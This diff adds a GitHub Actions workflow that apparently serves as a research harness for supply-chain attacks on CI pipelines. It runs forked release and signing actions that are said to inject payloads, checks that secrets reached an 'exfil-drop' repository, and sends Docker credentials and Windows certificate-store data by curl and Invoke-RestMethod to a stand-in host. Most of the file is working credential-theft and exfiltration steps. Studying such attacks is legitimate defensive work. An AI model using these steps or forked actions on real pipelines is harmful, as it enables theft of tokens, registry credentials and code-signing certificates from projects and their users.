@@ -1,0 +1,122 @@
+name: "Batch 3: Special Setup Attacks"
+on: workflow_dispatch
+
+permissions:
+  contents: write
+  id-token: write
+
+jobs:
+  test-aiohttp:
+    name: "#2 aiohttp — git push exfil"
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: "Run forked create-release (injection pushes secrets to exfil-drop)"
+        uses: rafidhaque/create-release@9c00aa733c05d7d48bf22cefc110572b706f4dc4
+        with:
+          github_token: ${{ secrets.GITHUB_TOKEN }}
+          pypi_token: "fake-pypi-token-for-testing"
+          type: "patch"
+          fix_version_regex: "."
+        continue-on-error: true
+
+      - name: "Verify: check if exfil-drop received data"
+        run: |
+          git clone https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/rafidhaque/exfil-drop.git /tmp/check-exfil 2>/dev/null || true
+          if [ -f /tmp/check-exfil/data.txt ]; then
+            echo "SUCCESS: data.txt was pushed to exfil-drop"
+            cat /tmp/check-exfil/data.txt
+          else
+            echo "Check: data.txt not found (action may have failed before injection ran)"
+            ls -la /tmp/check-exfil/ 2>/dev/null || echo "repo not cloned"
+          fi
+
+  test-compose-mechanism:
+    name: "#8 compose — Docker credential interception (mechanism)"
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: "Phase 1: Docker login (creates ~/.docker/config.json)"
+        run: |
+          echo "${{ secrets.GITHUB_TOKEN }}" | docker login ghcr.io -u ${{ github.actor }} --password-stdin
+          echo "=== Docker config after login ==="
+          ls -la ~/.docker/config.json
+
+      - name: "Phase 2: Simulate credential interception (this is what the payload does)"
+        run: |
+          echo "=== Reading ~/.docker/config.json (cross-step interception) ==="
+          if [ -f ~/.docker/config.json ]; then
+            echo "SUCCESS: config.json exists and is readable from a different step"
+            echo "=== Contents (would be exfiltrated in real attack) ==="
+            cat ~/.docker/config.json
+            echo ""
+            echo "=== Exfil attempt (will fail on example.com) ==="
+            cat ~/.docker/config.json | curl -sS -X POST -d @- https://eaction-research.example.com/docker-creds 2>&1 || true
+          else
+            echo "FAIL: config.json not found"
+          fi
+
+  test-cloakbrowser:
+    name: "#11 CloakBrowser — cosign artifact signing"
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      id-token: write
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: "Run forked cosign-installer (installs cosign, then injection signs malicious blob)"
+        uses: rafidhaque/cosign-installer@04d0ed21f0ab88f535900f297f745b0fdaa08be7
+        continue-on-error: true
+
+      - name: "Verify: check if malicious binary and signature were created"
+        run: |
+          echo "=== Check for malicious binary ==="
+          if [ -f /tmp/malicious.bin ]; then
+            echo "SUCCESS: /tmp/malicious.bin was created"
+            cat /tmp/malicious.bin
+          else
+            echo "FAIL: /tmp/malicious.bin not found"
+          fi
+          echo ""
+          echo "=== Check for signature ==="
+          if [ -f /tmp/malicious.sig ]; then
+            echo "SUCCESS: /tmp/malicious.sig was created (cosign signed the blob)"
+            cat /tmp/malicious.sig
+          else
+            echo "Signature not found (keyless signing may need Fulcio/Rekor which could fail in test)"
+          fi
+          echo ""
+          echo "=== Verify cosign is installed ==="
+          cosign version 2>/dev/null && echo "cosign is on PATH" || echo "cosign not found"
+
+  test-syncthing:
+    name: "#13 syncthing — Windows PowerShell cert theft"
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: "Run forked artifact-signing-action (injection enumerates cert stores)"
+        uses: rafidhaque/artifact-signing-action@4c86a364366bb97913dc47b5ff15bb8fbc75c53e
+        continue-on-error: true
+
+      - name: "Verify: PowerShell cert enumeration mechanism works"
+        shell: pwsh
+        run: |
+          Write-Host "=== Testing the same PowerShell command the payload uses ==="
+          $certs = Get-ChildItem -Path Cert:\CurrentUser\My, Cert:\LocalMachine\My -ErrorAction SilentlyContinue | Select-Object Subject, Thumbprint, NotAfter
+          if ($certs) {
+            Write-Host "SUCCESS: Found certificates in store"
+            $certs | ConvertTo-Json | Write-Host
+          } else {
+            Write-Host "No certs in store (expected on fresh runner — mechanism still works, just empty result)"
+          }
+          Write-Host ""
+          Write-Host "=== Exfil attempt (will fail on example.com) ==="
+          try {
+            $certs | ConvertTo-Json | Invoke-RestMethod -Uri "https://eaction-research.example.com/signing-certs" -Method Post -ContentType "application/json" -ErrorAction SilentlyContinue
+          } catch {
+            Write-Host "curl failed as expected (domain unresolvable): $_"
+          }
